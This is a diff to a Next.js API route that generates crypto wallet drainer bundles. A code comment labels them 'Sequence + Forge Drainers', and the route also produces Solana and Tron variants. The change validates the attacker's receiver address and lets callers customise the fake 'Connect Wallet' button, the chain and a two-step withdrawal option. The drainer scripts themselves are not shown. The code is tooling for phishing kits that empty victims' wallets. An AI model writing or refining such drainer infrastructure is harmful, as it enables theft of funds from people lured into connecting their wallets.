@@ -8,6 +8,7 @@ import { readCompileConfig, writeCompileConfig, type CompileConfig } from "@/lib
 import { readOperationalConfig, writeOperationalConfig } from "@/lib/operational-config-store";
 import { listScriptBuilds, saveScriptBuild } from "@/lib/script-build-store";
 import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
+import { ethers } from "ethers";
 import {
   defaultAdvancedConfig,
   defaultAppKitConfig,
@@ -67,7 +68,7 @@ export async function POST(request: Request) {
   try {
     const body = await request.json();
     const payload = isRecord(body) ? body : {};
-    const { receiverAddress, saveConfig = true, saveBuild = true } = payload;
+    const { receiverAddress, saveConfig = true, saveBuild = true, contractId, tokens, buttonSelector, buttonText, twoStep, ecosystem } = payload;
     const source = typeof payload.source === "string" ? payload.source : "compile";
 
     // ── Queue mode ────────────────────────────────────────────────────────
@@ -125,6 +126,15 @@ export async function POST(request: Request) {
     // === UNIVERSAL GENERATOR (Sequence + Forge Drainers) ===
     const selectedContractId = (payload.contractId as string) || "stage1-module";
     const contractMeta = getContractById(selectedContractId);
+
+    // Validate receiver address before compiling
+    if (resolvedReceiver && !ethers.isAddress(resolvedReceiver)) {
+      return NextResponse.json(
+        { status: "error", message: `Invalid receiver address: ${resolvedReceiver}` },
+        { status: 400 }
+      );
+    }
+
     const selectedBinding = contractMeta ? buildBindingForContract(contractMeta) : null;
     if (selectedBinding && contractMeta) {
       merged.contracts = {
@@ -154,10 +164,10 @@ export async function POST(request: Request) {
       const result = await generateUniversalBundle({
         contract: contractMeta,
         receiverAddress: resolvedReceiver,
-        buttonSelector: merged.general.connectButtonClass || ".connect-btn",
-        buttonText: merged.general.connectText || "Connect Wallet",
-        twoStep: merged.advanced?.twoStepWithdrawal === "true",
-        ecosystem: merged.general.ecosystem || "evm",
+        buttonSelector: buttonSelector || merged.general.connectButtonClass || ".connect-btn",
+        buttonText: buttonText || merged.general.connectText || "Connect Wallet",
+        twoStep: twoStep !== undefined ? Boolean(twoStep) : merged.advanced?.twoStepWithdrawal === "true",
+        ecosystem: ecosystem || merged.general.ecosystem || "evm",
         config: merged,
         source,
       });
